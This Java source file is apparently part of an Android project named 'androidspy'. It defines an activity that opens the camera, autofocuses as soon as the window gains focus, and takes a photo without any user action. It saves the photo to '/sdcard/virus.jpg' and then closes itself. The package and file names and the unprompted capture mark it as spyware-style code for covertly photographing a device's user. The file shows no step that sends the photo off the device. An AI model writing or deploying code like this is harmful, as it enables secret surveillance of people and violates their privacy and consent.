package com.gushuangchi.androidspy;

/**
 * Created by gushuangchi on 16/4/10.
 */
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import android.app.Activity;
import android.content.pm.ActivityInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.AutoFocusCallback;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.ShutterCallback;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.SurfaceHolder.Callback;
import android.view.View.OnClickListener;
import android.widget.ImageView;

public class NewActivity extends Activity implements Callback, OnClickListener {
    private Camera mCamera;
    private boolean mPreviewRunning;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        ImageView mImageView;
        SurfaceHolder mSurfaceHolder;
        SurfaceView mSurfaceView;

        super.onCreate(savedInstanceState);
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFormat(PixelFormat.TRANSLUCENT);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        setContentView(R.layout.activity_new);
        mSurfaceView = (SurfaceView) findViewById(R.id.camera);
        mImageView = (ImageView) findViewById(R.id.image);
        mImageView.setVisibility(View.GONE);
        mSurfaceView.setOnClickListener(this);
        mSurfaceHolder = mSurfaceView.getHolder();
        mSurfaceHolder.addCallback(this);
        mSurfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus)
    {
        if (hasFocus)
        {
            mCamera.autoFocus(mAutoFocusCallBack);
        }
    }

    @Override

    public void surfaceChanged(SurfaceHolder holder, int format, int width,
                               int height) {
        if (mPreviewRunning) {
            mCamera.stopPreview();
        }
        Parameters params = mCamera.getParameters();
        params.setPictureFormat(PixelFormat.JPEG);// 设置图片格式
        // params.setPreviewSize(width, height);
        params.set("rotation", 90);
        mCamera.setParameters(params);
        try {
            mCamera.setPreviewDisplay(holder);
        } catch (IOException e) {
            e.printStackTrace();
        }
        mCamera.startPreview();
        mPreviewRunning = true;
    }


    private AutoFocusCallback mAutoFocusCallBack = new AutoFocusCallback() {
        @Override
        public void onAutoFocus(boolean success, Camera camera) {
            Log.v("AutoFocusCallback", "AutoFocusCallback , boolean success:"+ success);
            Camera.Parameters Parameters = mCamera.getParameters();
            Parameters.setPictureFormat(PixelFormat.JPEG);// 设置图片格式
            mCamera.setParameters(Parameters);
            mCamera.takePicture(mShutterCallback, null, mPictureCallback);
        }
    };

    @Override

    public void surfaceCreated(SurfaceHolder holder) {
        mCamera = Camera.open();
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        mCamera.stopPreview();
        mPreviewRunning = false;
        mCamera.release();
        mCamera = null;
    }

    PictureCallback mPictureCallback = new PictureCallback() {
        @Override
        public void onPictureTaken(byte[] data, Camera camera) {
            Log.v("PictureCallback", "…onPictureTaken…");
            if (data != null) {
                Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0,
                        data.length);


                File file = new File("/sdcard/virus.jpg");
                FileOutputStream fileOutStream=null;
                try {
                    fileOutStream=new FileOutputStream(file);
                    //把位图输出到指定的文件中
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fileOutStream);
                    fileOutStream.close();
                    NewActivity.this.finish();
                } catch (IOException io) {
                    io.printStackTrace();
                    NewActivity.this.finish();
                }

                if (mPreviewRunning) {
                    mCamera.stopPreview();
                    mPreviewRunning = false;
                }
            }
        }
    };
    /**
     * 在相机快门关闭时候的回调接口，通过这个接口来通知用户快门关闭的事件，
     * 普通相机在快门关闭的时候都会发出响声.
     * 根据需要可以在该回调接口中定义各种动作， 例如：使设备震动
     */
    ShutterCallback mShutterCallback = new ShutterCallback() {
        public void onShutter() {
            // just log ,do nothing
            Log.v("ShutterCallback", "…onShutter…");
        }
    };

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_DPAD_CENTER) {

            if (mCamera != null) {
                // mCamera.takePicture(null, null,mPictureCallback);
                mCamera.autoFocus(mAutoFocusCallBack);
                setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_SENSOR);
            }

        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onClick(View arg0) {
        Log.v("onClick", "…onClick…");
    }
}

